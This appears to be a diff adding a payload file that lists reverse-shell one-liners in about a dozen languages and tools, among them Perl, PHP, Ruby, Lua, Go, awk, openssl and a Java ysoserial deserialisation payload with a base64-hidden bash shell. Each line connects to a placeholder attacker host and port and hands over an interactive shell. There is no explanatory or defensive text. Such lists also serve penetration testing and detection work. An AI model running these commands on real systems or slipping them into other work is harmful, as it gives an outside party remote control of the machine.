@@ -1,0 +1,15 @@
+perl -e 'use Socket;$i="ATTACKER_IP";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:ATTACKER_PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+php -r '$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);exec("sh <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
+php -r '$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);shell_exec("sh <&3 >&3 2>&3");'
+ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",ATTACKER_PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("ATTACKER_IP","ATTACKER_PORT");loop{c.gets.chomp!;(IO.popen($_,"r"){|io|c.print io.read})rescue nil}'
+java -jar ysoserial.jar CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9BVFRBQ0tFUl9QT1JUIDA+JjE=}|{base64,-d}|{bash,-i}' > payload.bin
+r = Runtime.getRuntime(); p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"}); p.waitFor();
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','ATTACKER_PORT');os.execute('sh -i <&3 >&3 2>&3');"
+lua5.1 -e 'local host, port = "ATTACKER_IP", ATTACKER_PORT local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:ATTACKER_PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:ATTACKER_PORT > /tmp/s; rm /tmp/s
+awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/ATTACKER_PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+xterm -display ATTACKER_IP:1
